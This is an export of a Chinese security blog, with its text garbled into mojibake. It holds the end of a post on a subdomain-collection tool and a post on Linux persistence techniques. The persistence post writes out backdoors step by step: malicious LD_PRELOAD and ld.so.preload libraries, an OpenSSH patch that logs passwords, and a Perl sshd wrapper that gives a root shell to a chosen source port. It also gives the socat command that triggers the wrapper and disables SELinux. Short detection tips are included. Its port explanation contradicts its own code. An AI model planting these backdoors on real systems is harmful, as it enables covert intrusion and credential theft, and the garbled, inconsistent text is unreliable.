wc_ipså‚æ•°ã€‚æœ€ç»ˆæ˜¯ç”¨äºåˆ¤æ–­domainçš„å­åŸŸååˆ°åº•æ˜¯ä¸æ˜¯æ³›è§£æã€‚å¹¶ä¸”è¿™ä¸ªå‡½æ•°ä¹Ÿä¼šè¢«deal_wildcardè°ƒç”¨ã€‚</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collect_wildcard_record</span>(<span class="params">domain, authoritative_ns</span>):</span></span><br><span class="line">...</span><br><span class="line"><span class="comment"># é€šè¿‡å„ç§æ–¹å¼(åªçœ‹æ‡‚äº†é»‘åå•éƒ¨åˆ†çš„ä»£ç )è¿‡æ»¤æ‰å­åŸŸååˆé›†é‡Œçš„æ³›è§£æå­åŸŸå</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deal_wildcard</span>(<span class="params">data</span>):</span></span><br><span class="line">    new_data = <span class="built_in">list</span>()</span><br><span class="line">    appear_times = stat_times(data)</span><br><span class="line">    <span class="keyword">for</span> info <span class="keyword">in</span> data:</span><br><span class="line">        subdomain = info.get(<span class="string">&#x27;subdomain&#x27;</span>)</span><br><span class="line">        isvalid, reason = check_valid_subdomain(appear_times, info)</span><br><span class="line">        logger.log(<span class="string">&#x27;DEBUG&#x27;</span>, <span class="string">f&#x27;<span class="subst">&#123;subdomain&#125;</span> is <span class="subst">&#123;isvalid&#125;</span> subdomain reason because <span class="subst">&#123;reason&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> isvalid:</span><br><span class="line">            new_data.append(info)</span><br><span class="line">    <span class="keyword">return</span> new_data</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="subdomainCol-æ³›è§£æå®ç°é€»è¾‘"><a href="#subdomainCol-æ³›è§£æå®ç°é€»è¾‘" class="headerlink" title="subdomainCol-æ³›è§£æå®ç°é€»è¾‘"></a>subdomainCol-æ³›è§£æå®ç°é€»è¾‘</h2><ol>
<li>è¾“å…¥å­åŸŸå - domains<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx1.xxx2.xxx3.xxx4</span><br><span class="line">yyy1.yyy2.yyy3</span><br><span class="line">zzz1.zzz2.zzz3.zzz4</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
<li><code>get_upper_domains(domains)</code>è·å–ä¸Šä¸€çº§åŸŸåé›†åˆå¹¶å»é‡ - upper_domains<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxx2.xxx3.xxx4</span><br><span class="line">yyy2.yyy3</span><br><span class="line">zzz2.zzz3.zzz4</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
<li><code>get_upper_domain_infos(upper_domains)</code><br>è·å–upper_domainsæ‰€éœ€çš„ä¸‰ä¸ªä¿¡æ¯ï¼š<br>(1)enable_wc - é€šè¿‡<code>detect_wildcard()</code>å‡½æ•°åˆ¤æ–­è¯¥åŸŸåæ˜¯å¦å¼€å¯æ³›è§£æ<br>å¦‚æœå¼€å¯æ³›è§£æåˆ™è°ƒç”¨<code>collect_wildcard_record()</code>å‡½æ•°è·å–ä¿¡æ¯(2)(3)ï¼Œåä¹‹ä¸éœ€è¦ã€‚<br>(2)wc_ips - æ³›è§£æIPåˆ—è¡¨<br>(3)wc_ttl - æ³›è§£æTTLæ•´å‹å€¼</li>
<li>éå†step1è¾“å…¥çš„å­åŸŸå - domains<br>(1)å¦‚æœå…¶ä¸Šä¸€çº§åŸŸå<code>upper_domain</code>æ²¡æœ‰å¼€å¯æ³›è§£æåˆ™ç›´æ¥è®¤ä¸ºæ˜¯æœ‰æ•ˆå­åŸŸå<br>(2)åä¹‹åŠ å…¥åŸŸååˆ—<code>uncertain_subdomains</code>ç»§ç»­åˆ¤æ–­</li>
<li><code>get_uncertain_subdomain_infos(uncertain_subdomains)</code>è·å–åŸŸåçš„ä»¥ä¸‹ä¿¡æ¯<br>ttl/cnames/ips/max_ip_num/max_cname_num</li>
<li>éå†<code>uncertain_subdomain_infos</code>ï¼Œå¯¹æ¯ä¸ª<code>uncertain_subdomain</code>è¿›è¡Œ<code>is_valid_subdomain()</code>åˆ¤æ–­</li>
<li><code>is_valid_subdomain()</code><br>(1)é€šè¿‡cnameé»‘åå•å’Œipé»‘åå•è¿‡æ»¤å­åŸŸå<br>(2)check_by_compareæå–æœ‰æ•ˆip<br>(3)é€šè¿‡cnameå’Œipå‡ºç°æ¬¡æ•°è¿‡æ»¤å­åŸŸå</li>
</ol>
<h2 id="ç¯å¢ƒä¾èµ–"><a href="#ç¯å¢ƒä¾èµ–" class="headerlink" title="ç¯å¢ƒä¾èµ–"></a>ç¯å¢ƒä¾èµ–</h2><ol>
<li>å®‰è£…æ‰€è°ƒç”¨å·¥å…·<a href="https://github.com/projectdiscovery/subfinder">subfinder</a>ã€<a href="https://github.com/knownsec/ksubdomain">ksubdomain</a>çš„é…ç½®ã€‚</li>
<li>æ›¿æ¢ä»¥ä¸‹ä¸¤ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸ºå¯¹åº”å¹³å°ç‰ˆæœ¬<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SubdomainCol&#x2F;bin&#x2F;ksubdomain&#x2F;ksubdomain</span><br><span class="line">SubdomainCol&#x2F;bin&#x2F;subfinder&#x2F;subfinder</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="æ¨è"><a href="#æ¨è" class="headerlink" title="æ¨è"></a>æ¨è</h3><p>Linux-CentOS - å·²æµ‹è¯•å¯è¿è¡Œï¼Œä¸¢æœåŠ¡å™¨ä¸Šå¾ˆè‡ªç”±ã€‚</p>
<h3 id="ä¸æ¨è"><a href="#ä¸æ¨è" class="headerlink" title="ä¸æ¨è"></a>ä¸æ¨è</h3><p>macOS - å·²æµ‹è¯•å¯è¿è¡Œï¼Œä½†ksubdomainè€—èµ„æºï¼Œä¸æƒ³å¹é£æ‰‡/å¿ƒç–¼ç”µè„‘çš„ä¸æ¨èã€‚<br>Win - æœªæµ‹è¯•ï¼ŒåŒç†å› ä¸ºè€—èµ„æºä¸æ¨èã€‚ä¸è¿‡æ¨æµ‹å®‰è£…ä¾èµ–+æ›¿æ¢binä¸‹çš„å·¥å…·ç¨‹åºä¸ºwinç‰ˆæœ¬å³å¯ã€‚</p>
<h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><h3 id="subdomainCol"><a href="#subdomainCol" class="headerlink" title="subdomainCol"></a>subdomainCol</h3><ol>
<li>xrayé«˜çº§ç‰ˆçš„å­åŸŸååŠŸèƒ½é›†æˆ<br>ä¸»è¦æ˜¯è‡ªå·±æ²¡æœ‰ï¼Œæœ‰çš„è¯å°±åŠ ä¸Šã€‚ä¸è¿‡è‡ªå·±å†™ä¹Ÿå¾ˆå¿«ã€‚</li>
<li>æ›´å¤šå¯æ§å‚æ•°<br>æ¯”å¦‚è¢«è°ƒç”¨çš„subfinderå’Œksubdomainçš„è¿è¡Œå‚æ•°æ§åˆ¶ï¼Œè¾“å‡ºæ–‡ä»¶ä½ç½®æ§åˆ¶ç­‰ç­‰ã€‚ä½†çº ç»“éƒ¨åˆ†çš„å¿…è¦æ€§ã€‚</li>
<li>æš‚æ—¶æƒ³ä¸åˆ°ï¼Œæ¬¢è¿æéœ€æ±‚<br>ä½†ä½œä¸ºä¸€ä¸ªçº¯ç²¹çš„å­åŸŸåæ”¶é›†å·¥å…·è¿˜éœ€è¦åˆ«çš„å—ğŸ¤”å¥½åƒä¹Ÿæ²¡æœ‰ã€‚</li>
</ol>
<h3 id="ç›¸å…³"><a href="#ç›¸å…³" class="headerlink" title="ç›¸å…³"></a>ç›¸å…³</h3><ol>
<li>ä¸»/è¢«åŠ¨å­åŸŸåå­—å…¸æ”¶é›†<br>è¢«åŠ¨ - chromeæ’ä»¶ï¼Ÿburpæ’ä»¶ï¼Ÿ<br>ä¸»åŠ¨ - æ¯æ¬¡å¯¹æ”¶é›†ç»“æœè¿›è¡Œå¤„ç†çš„å°è„šæœ¬ï¼Ÿ<br>è¿˜æ²¡æœ‰æœé›†è¿‡è¿™å—çš„å·²ç»å®ç°çš„è½®å­æˆ–è€…å…¶ä»–ç›¸å…³ä¿¡æ¯ï¼Œè‹¥æœ‰å¸Œæœ›å¤§ä½¬è¯„è®ºåŒºæ¨èä¸€ä¸‹ã€‚</li>
<li>æ‰«titleå’Œåˆ¤æ–­æŒ‡çº¹çš„è°ƒç”¨è„šæœ¬</li>
</ol>
<h2 id="æœªå®Œå¾…ç»­"><a href="#æœªå®Œå¾…ç»­" class="headerlink" title="æœªå®Œå¾…ç»­"></a>æœªå®Œå¾…ç»­</h2><p>è¿™æ®µæ—¶é—´å†åšä¸€äº›å®Œå–„å’Œæµ‹è¯•å†æŠŠé¡¹ç›®æ”¾åˆ°githubä¸Šã€‚</p>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title>Linuxå•æœºæƒé™ç»´æŒ</title>
    <url>/posts/45846/</url>
    <content><![CDATA[<h1 id="Linuxå•æœºæƒé™ç»´æŒ"><a href="#Linuxå•æœºæƒé™ç»´æŒ" class="headerlink" title="Linuxå•æœºæƒé™ç»´æŒ"></a>Linuxå•æœºæƒé™ç»´æŒ</h1><h2 id="è¿›ç¨‹æ³¨å…¥"><a href="#è¿›ç¨‹æ³¨å…¥" class="headerlink" title="è¿›ç¨‹æ³¨å…¥"></a>è¿›ç¨‹æ³¨å…¥</h2><p>ç›®å‰çœ‹æ¥æ‰€æœ‰çš„è¿›ç¨‹æ³¨å…¥éƒ½æ˜¯æŒ‡çš„ä»¥é™„åŠ <code>.so</code>æ–‡ä»¶çš„å½¢å¼æ³¨å…¥ã€‚</p>
<p>åŸç†:<a href="https://0x00sec.org/t/linux-infecting-running-processes/1097">Linux Infecting Running Processes</a><br>è¯‘æ–‡:<a href="https://kevien.github.io/2018/01/28/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/">linuxè¿›ç¨‹æ³¨å…¥</a></p>
<p>å·¥å…·æ¨è:<br>1.<a href="https://github.com/gaffe23/linux-inject/">linux-inject</a><br>ä½¿ç”¨ptraceå‘è¿›ç¨‹ä¸­æ³¨å…¥æ¶æ„soæ–‡ä»¶<br>ä½¿ç”¨ç¤ºä¾‹:<a href="https://payloads.online/archivers/2020-01-01/2">Linuxæƒé™ç»´æŒä¹‹è¿›ç¨‹æ³¨å…¥</a><br>2.<a href="https://github.com/DavidBuchanan314/dlinject">dlinject</a><br>ä¸ä½¿ç”¨ptraceå‘è¿›ç¨‹ä¸­æ³¨å…¥æ¶æ„soæ–‡ä»¶</p>
<h3 id="æ’æŸ¥æ–¹å¼"><a href="#æ’æŸ¥æ–¹å¼" class="headerlink" title="æ’æŸ¥æ–¹å¼"></a>æ’æŸ¥æ–¹å¼</h3><p>1.åŸºäºæ—¶é—´çº¿ç´¢ç­›å‡ºsoæ–‡ä»¶<br>2.éå†è¿›ç¨‹ï¼Œè·å–soè§‚å¯Ÿæ—¶é—´</p>
<a id="more"></a>
<h2 id="Linuxé¢„åŠ è½½å‹æ¶æ„åŠ¨æ€é“¾æ¥åº“"><a href="#Linuxé¢„åŠ è½½å‹æ¶æ„åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="Linuxé¢„åŠ è½½å‹æ¶æ„åŠ¨æ€é“¾æ¥åº“"></a>Linuxé¢„åŠ è½½å‹æ¶æ„åŠ¨æ€é“¾æ¥åº“</h2><h3 id="é¢„å¤‡çŸ¥è¯†ç‚¹"><a href="#é¢„å¤‡çŸ¥è¯†ç‚¹" class="headerlink" title="é¢„å¤‡çŸ¥è¯†ç‚¹"></a>é¢„å¤‡çŸ¥è¯†ç‚¹</h3><p>1.linuxåŠ¨æ€é“¾æ¥åº“é¢„åŠ è½½æœºåˆ¶ï¼š<br>åœ¨linuxæ“ä½œç³»ç»Ÿçš„åŠ¨æ€é“¾æ¥åº“åŠ è½½è¿‡ç¨‹ä¸­ï¼ŒåŠ¨æ€é“¾æ¥å™¨ä¼šè¯»å–<code>LD_PRELOAD</code>ç¯å¢ƒå˜é‡çš„å€¼å’Œé»˜è®¤é…ç½®æ–‡ä»¶<code>/etc/ld.so.preload</code>çš„æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†è¯»å–åˆ°çš„åŠ¨æ€é“¾æ¥åº“è¿›è¡Œé¢„åŠ è½½ã€‚å³ä½¿ç¨‹åºä¸ä¾èµ–è¿™äº›åŠ¨æ€é“¾æ¥åº“ï¼Œ<code>LD_PRELOAD</code>ç¯å¢ƒå˜é‡å’Œ<code>/etc/ld.so.preload</code>é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šçš„åŠ¨æ€é“¾æ¥åº“ä¾ç„¶ä¼šè¢«è£…è½½ï¼Œå®ƒä»¬çš„ä¼˜å…ˆçº§æ¯”<code>LD_LIBRARY_PATH</code>ç¯å¢ƒå˜é‡æ‰€å®šä¹‰çš„é“¾æ¥åº“æŸ¥æ‰¾è·¯å¾„çš„æ–‡ä»¶ä¼˜å…ˆçº§è¦é«˜ï¼Œæ‰€ä»¥èƒ½å¤Ÿæå‰äºç”¨æˆ·è°ƒç”¨çš„åŠ¨æ€åº“è½½å…¥ã€‚</p>
<p>2.å…¨å±€ç¬¦å·ä»‹å…¥<br>å…¨å±€ç¬¦å·ä»‹å…¥æŒ‡çš„æ˜¯åº”ç”¨ç¨‹åºè°ƒç”¨åº“å‡½æ•°æ—¶ï¼Œè°ƒç”¨çš„åº“å‡½æ•°å¦‚æœåœ¨å¤šä¸ªåŠ¨æ€é“¾æ¥åº“ä¸­éƒ½å­˜åœ¨(å­˜åœ¨åŒåå‡½æ•°)ï¼Œé‚£ä¹ˆé“¾æ¥å™¨åªä¼šä¿ç•™ç¬¬ä¸€ä¸ªé“¾æ¥çš„å‡½æ•°ï¼Œè€Œå¿½ç•¥åé¢é“¾æ¥è¿›æ¥çš„å‡½æ•°ã€‚æ‰€ä»¥åªè¦é¢„åŠ è½½çš„å…¨å±€ç¬¦å·ä¸­æœ‰å’ŒååŠ è½½çš„æ™®é€šå…±äº«åº“ä¸­å…¨å±€ç¬¦å·é‡åï¼Œé‚£ä¹ˆå°±ä¼šè¦†ç›–åè£…è½½çš„å…±äº«åº“ä»¥åŠç›®æ ‡æ–‡ä»¶é‡Œçš„å…¨å±€ç¬¦å·ã€‚</p>
<h3 id="åˆ©ç”¨LD-PRELOADç¯å¢ƒå˜é‡"><a href="#åˆ©ç”¨LD-PRELOADç¯å¢ƒå˜é‡" class="headerlink" title="åˆ©ç”¨LD_PRELOADç¯å¢ƒå˜é‡"></a>åˆ©ç”¨LD_PRELOADç¯å¢ƒå˜é‡</h3><p>LD_PRELOADç¯å¢ƒå˜é‡æ˜¯ä¼šåŠæ—¶ç”Ÿæ•ˆçš„ï¼ŒåŠ è½½æ¶æ„åŠ¨æ€é“¾æ¥åº“æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LD_PRELOAD&#x3D;&#x2F;lib&#x2F;evil.so # LD_PRELOADçš„å€¼è®¾ç½®ä¸ºè¦é¢„åŠ è½½çš„åŠ¨æ€é“¾æ¥åº“</span><br><span class="line">export LD_PRELOAD # å¯¼å‡ºç¯å¢ƒå˜é‡ä½¿è¯¥ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ</span><br></pre></td></tr></table></figure>
<p>ï¼ˆå¯¼å‡ºååº”è¯¥å°±ä¼šè¢«éšè—ï¼Œæ²¡è¯•ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p>
<h4 id="æ’æŸ¥"><a href="#æ’æŸ¥" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $LD_PRELOAD # æŸ¥çœ‹æ˜¯å¦åŠ è½½äº†åº“ä»¥åŠæ˜¯å¦æ¶æ„</span><br><span class="line">unset LD_PRELOAD # è§£é™¤è®¾ç½®çš„LD_PRELOADç¯å¢ƒå˜é‡</span><br></pre></td></tr></table></figure>

<h3 id="åˆ©ç”¨ld-so-preloadé…ç½®æ–‡ä»¶"><a href="#åˆ©ç”¨ld-so-preloadé…ç½®æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨ld.so.preloadé…ç½®æ–‡ä»¶"></a>åˆ©ç”¨ld.so.preloadé…ç½®æ–‡ä»¶</h3><p>å°†æ¶æ„åŠ¨æ€é“¾æ¥åº“è·¯å¾„å†™å…¥<code>/etc/ld.so.preload</code>(æ²¡æœ‰åˆ™åˆ›å»º)é…ç½®æ–‡ä»¶ä¸­å³ç”Ÿæ•ˆï¼Œå¯¹åº”çš„æ¶æ„åŠ¨æ€é“¾æ¥åº“æ–‡ä»¶è¢«éšè—ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&#x2F;lib&#x2F;evil.so&quot; &gt; &#x2F;etc&#x2F;ld.so.preload</span><br></pre></td></tr></table></figure>

<h4 id="æ’æŸ¥-1"><a href="#æ’æŸ¥-1" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><p>å› ä¸ºæ¶æ„åŠ¨æ€é“¾æ¥åº“ä¸€èˆ¬éƒ½æœ‰éšè—<code>/etc/ld.so.preload</code>æ–‡ä»¶çš„åŠŸèƒ½ï¼Œä½¿ç”¨æ™®é€šçš„<code>ls</code>ã€<code>cat</code>ç­‰å‘½ä»¤æ— æ³•è¯»å–å¯¹åº”é…ç½®æ–‡ä»¶çš„å†…å®¹ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é™æ€ç¼–è¯‘çš„<code>ls</code>å‘½ä»¤ã€<code>cat</code>å‘½ä»¤ï¼ˆæ¨èä½¿ç”¨busyboxè‡ªå¸¦å‘½ä»¤)æ¥ç»•è¿‡é¢„åŠ è½½çš„æ¶æ„åŠ¨æ€é“¾æ¥åº“ã€‚</p>
<p>æ¸…é™¤é¡ºåº:<br>(a)<code>/etc/ld.so.preload</code>æ–‡ä»¶ä¸­æŸ¥çœ‹åˆ°çš„<code>/lib/evil.so</code>æ–‡ä»¶<br>(b)<code>/etc/ld.so.preload</code>æ–‡ä»¶ä¸­çš„å†…å®¹</p>
<p>æ’æŸ¥æ¡ˆä¾‹å‚è€ƒ:<br><a href="https://www.jianshu.com/p/31e487daa79d">è®°ä¸€æ¬¡CPUå ç”¨è¿‡åŠï¼Œè¿›ç¨‹è¢«éšè—çš„æœ¨é©¬</a><br><a href="https://www.fooying.com/linux-hide-process-miner-analysis/">Linux é­å…¥ä¾µï¼ŒæŒ–çŸ¿è¿›ç¨‹è¢«éšè—æ¡ˆä¾‹åˆ†æ</a></p>
<h3 id="ä¿®æ”¹åŠ¨æ€é“¾æ¥å™¨"><a href="#ä¿®æ”¹åŠ¨æ€é“¾æ¥å™¨" class="headerlink" title="ä¿®æ”¹åŠ¨æ€é“¾æ¥å™¨"></a>ä¿®æ”¹åŠ¨æ€é“¾æ¥å™¨</h3><p>é€šè¿‡ä¿®æ”¹åŠ¨æ€é“¾æ¥å™¨ä¸­é…ç½®æ–‡ä»¶è·¯å¾„<code>/etc/ld.so.preload</code>ä¸ºè‡ªå®šä¹‰çš„è·¯å¾„æ¥å®ç°æ›´åŠ éšè”½çš„æ¶æ„åŠ¨æ€é“¾æ¥åº“é¢„åŠ è½½ã€‚<br>rootkitç¤ºä¾‹:<a href="https://github.com/mempodippy/vlany">Vlany</a></p>
<h4 id="æ’æŸ¥-2"><a href="#æ’æŸ¥-2" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h4><p>ä½¿ç”¨æ–‡ä»¶å®Œæ•´æ€§æ£€æŸ¥æ¥æ£€æŸ¥è¯¥åŠ¨æ€é“¾æ¥å™¨æ˜¯å¦è¢«ä¿®æ”¹ã€‚</p>
<h2 id="åŸºäºSSHè¡ç”Ÿåé—¨"><a href="#åŸºäºSSHè¡ç”Ÿåé—¨" class="headerlink" title="åŸºäºSSHè¡ç”Ÿåé—¨"></a>åŸºäºSSHè¡ç”Ÿåé—¨</h2><p>ç”¨çš„ä¼¼ä¹ä¸å¤šï¼Œå› ä¸ºå…¬ç½‘å¼€sshçš„ä¸å¤šã€‚</p>
<h3 id="opensshæºç åŒ…æ›¿æ¢åé—¨æ–‡ä»¶"><a href="#opensshæºç åŒ…æ›¿æ¢åé—¨æ–‡ä»¶" class="headerlink" title="opensshæºç åŒ…æ›¿æ¢åé—¨æ–‡ä»¶"></a>opensshæºç åŒ…æ›¿æ¢åé—¨æ–‡ä»¶</h3><h4 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a>CentOS</h4><p>å®è·µå‚è€ƒ:<br>1.<a href="https://blog.csdn.net/Aixixxx/article/details/104399536">OpenSSHä¸‡èƒ½åé—¨</a><br>2.<a href="https://cdn.openbsd.org/pub/OpenBSD/OpenSSH/portable/">OpenSSHæºç ä¸‹è½½åœ°å€</a></p>
<p>å®è·µçš„è¿‡ç¨‹å‘ç°ç¼–è¯‘å‡ºé”™ï¼Œçœ‹äº†ä¸€ä¸‹ä»£ç å‘ç°æ˜¯åšä¸»åŸæ–‡å†™é”™:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auth-passwd.c:88:57: é”™è¯¯ï¼šâ€˜Authctxtâ€™æ²¡æœ‰åä¸ºâ€˜server_userâ€™çš„æˆå‘˜</span><br><span class="line">   fprintf(f,&quot;user:password@host --&gt; %s:%s@%s\n&quot;,authctxt-&gt;server_user,password,authctxt-&gt;host);</span><br><span class="line">auth-passwd.c:88:88: é”™è¯¯ï¼šâ€˜Authctxtâ€™æ²¡æœ‰åä¸ºâ€˜hostâ€™çš„æˆå‘˜</span><br><span class="line">   fprintf(f,&quot;user:password@host --&gt; %s:%s@%s\n&quot;,authctxt-&gt;server_user,password,authctxt-&gt;host);</span><br></pre></td></tr></table></figure>
<p>æ”¹æˆå¦‚ä¸‹å³å¯:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fprintf(f,&quot;username: %s password: %s&quot;, authctxt-&gt;user, password);</span><br></pre></td></tr></table></figure>

<p>Centos SSHæ—¥å¿—ä½ç½®:<code>/var/log/secure</code></p>
<h4 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h4><p>åˆ«é—®â€¦é—®å°±æ˜¯æäº†ä¸¤å°æ—¶ç¯å¢ƒéƒ½æ²¡æå¯¹â€¦.</p>
<h3 id="ssh-wrapperæ­£å‘åé—¨"><a href="#ssh-wrapperæ­£å‘åé—¨" class="headerlink" title="ssh wrapperæ­£å‘åé—¨"></a>ssh wrapperæ­£å‘åé—¨</h3><p>å¯ä»¥ç†è§£ä¸ºå¦å†™äº†ä¸€ä¸ªå¸¦sshåŠŸèƒ½çš„ç¨‹åºä»£æ›¿äº†<code>/usr/sbin/sshd</code></p>
<p>å—å®³ä¸»æœºä¸Šæ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# cd &#x2F;usr&#x2F;sbin</span><br><span class="line">[root@localhost sbin]# mv sshd ..&#x2F;bin</span><br><span class="line">[root@localhost sbin]# echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">[root@localhost sbin]# echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">[root@localhost sbin]# echo &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">[root@localhost sbin]# chmod +x sshd</span><br><span class="line">[root@localhost sbin]# service sshd restart</span><br></pre></td></tr></table></figure>
<p>åé—¨ä»£ç è§£é‡Šï¼š<br>ç¬¬ä¸€è¡Œï¼Œå¦‚æœå½“å‰æ–‡ä»¶å¥æŸ„STDINæ˜¯ä¸€ä¸ªsocketï¼Œä¸”socketçš„è¿œç¨‹è¿æ¥æºç«¯å£æ˜¯31334ï¼ˆBigç½‘ç»œå­—èŠ‚åºä¸­çš„16è¿›åˆ¶å­—ç¬¦ä¸²ä¸º<code>\x00\x00zf</code>ï¼Œ æ­£å¥½åŒ¹é…ä¸Šperlæ­£åˆ™<code>..zf</code>ï¼Œä¸Šè¿°ä»£ç ä¸­çš„<code>zf</code>æ˜¯Bigç½‘ç»œå­—èŠ‚åºçš„Asciiè¡¨ç¤ºå½¢å¼ï¼‰ï¼Œåˆ™æ‰§è¡Œ<code>/bin/sh</code>ï¼Œå¹¶ç»“æŸå½“å‰ç¨‹åºè¿è¡Œï¼ˆä¸ä¼šæ‰§è¡Œç¬¬äºŒæ­¥ï¼‰ï¼Œç›¸å½“äºåå¼¹ä¸€ä¸ªroot shellï¼ˆå› ä¸ºsshdæ˜¯ä»¥rootæƒé™è¿è¡Œçš„ï¼‰ç»™è¿œç¨‹socketï¼ˆä¸€èˆ¬åªæœ‰æ”»å‡»è€…æŒ‡å®šè¿æ¥çš„æºç«¯å£æ‰èƒ½è§¦å‘è¿™ä¸€è¡Œçš„æ‰§è¡Œï¼‰<br>ç¬¬äºŒè¡Œï¼Œå¯åŠ¨sshd(/usr/bin/sshdæ˜¯çœŸæ­£çš„sshd)æœåŠ¡ï¼Œå‡¡æ˜¯ä¼ é€’ç»™<code>/usr/sbin/sshd</code>(åé—¨)çš„å‚æ•°éƒ½ä¼ é€’ç»™çœŸæ­£çš„sshdï¼ˆè¿™ä¸€è¡Œä¿è¯äº†æ™®é€šç”¨æˆ·ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨sshæœåŠ¡ï¼Œç™»å½•å¹¶ä¸ä¼šæœ‰ä»€ä¹ˆå¼‚å¸¸ç°è±¡ï¼‰</p>
<p>æ”»å‡»ä¸»æœºä¸Šæ‰§è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat STDIO TCP4:10.18.180.20:22,sourceport&#x3D;13377</span><br></pre></td></tr></table></figure>
<p>æºç«¯å£ä¿®æ”¹è®¡ç®—ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> struct</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">19526</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span><br><span class="line"><span class="string">&#x27;\x00\x00LF&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,<span class="number">13377</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> buffer</span><br><span class="line">4A</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€ä¸ªPythonç‰ˆ:<a href="https://zhuanlan.zhihu.com/p/75864959">ä½¿ç”¨pythonç¼–å†™äº†opensshåé—¨</a>ï¼Œæ²¡æœ‰è¯•ã€‚</p>
<h4 id="CentOS7å®è·µçš„å‘"><a href="#CentOS7å®è·µçš„å‘" class="headerlink" title="CentOS7å®è·µçš„å‘"></a>CentOS7å®è·µçš„å‘</h4><p>æŠŠ<code>/usr/sbin/sshd</code>ç¯¡æ”¹åï¼Œæ­£å¸¸ç”¨æˆ·æ— æ³•sshè¿ä¸Šå»ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># mieea @ mieea-mbp in ~ [9:08:38]</span><br><span class="line">$ ssh u111@10.211.55.12 -p 22</span><br><span class="line">u111@10.211.55.12&#39;s password:</span><br><span class="line">Last login: Fri Oct 30 09:05:02 2020</span><br><span class="line">&#x2F;bin&#x2F;bash: Permission denied</span><br><span class="line">Connection to 10.211.55.12 closed.</span><br></pre></td></tr></table></figure>
<p>æœç´¢åå‘ç°æ˜¯ç”±äºSeLinuxæ£€æµ‹åˆ°sshdæ–‡ä»¶å·²æ›´æ”¹ï¼Œå› æ­¤å¦‚æœä¸ç¦ç”¨SeLinuxï¼Œå®ƒå°†é˜»æ­¢é€šè¿‡sshè¿æ¥æœåŠ¡å™¨ã€‚<br>äºæ˜¯æˆ‘æŠŠ<code>/etc/selinux/config</code>çš„SELinuxå±æ€§è®¾ç½®ä¸ºdisabledï¼Œå†<code>reboot</code>é‡å¯ï¼Œsshå°±èƒ½æ­£å¸¸ä½¿ç”¨äº†ã€‚</p>
<p>å› ä¸ºé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘åœ¨Ubuntu18.04ä¸‹ä¹Ÿè¯•äº†ä¸€æ¬¡ï¼Œå¹¶æ²¡æœ‰å½±å“æ­£å¸¸ç”¨æˆ·sshè¿æ¥ã€‚nice :)</p>
